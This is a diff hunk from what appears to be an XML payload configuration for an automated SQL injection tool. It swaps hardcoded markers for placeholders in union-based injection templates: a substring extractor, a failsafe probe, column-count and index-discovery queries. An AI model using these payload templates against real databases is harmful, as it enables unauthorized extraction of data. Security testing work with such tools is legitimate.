@@ -110,21 +110,21 @@ select concat(
     <strategy>
         <configuration>
             <slidingWindow>
-select'SQLi'||substr(r,${INDEX},
+select'${LEAD}'||substr(r,${INDEX},
     /**
-     * Minus 'SQLi' should apply
+     * Minus '${LEAD}' should apply
      */
     ${CAPACITY}
 )from(${INJECTION})x
             </slidingWindow>
             <limit> limit ${LIMIT},65536</limit>
             <failsafe>select(1337${INDICE}7330%2b1)||''r FROM(VALUES(0))</failsafe>
-            <calibrator>repeat('%23',1024)</calibrator>
+            <calibrator>repeat('${CALIBRATOR_SQL}',1024)</calibrator>
             <limitBoundary>0</limitBoundary>
         </configuration>
         <normal>
-            <indices> union select ${STARS} from(${INDICES_STARS})b</indices>
-            <capacity>('SQLi'||${INDICE}||${CALIBRATOR}||'${TRAIL_SQL}')</capacity>
+            <indices> union select ${RESULT_RANGE} from(${INDICE_UNIQUE})b</indices>
+            <capacity>('${LEAD}'||${INDICE}||${CALIBRATOR}||'${TRAIL_SQL}')</capacity>
             <orderBy> order by 1337</orderBy>
         </normal>
     </strategy>
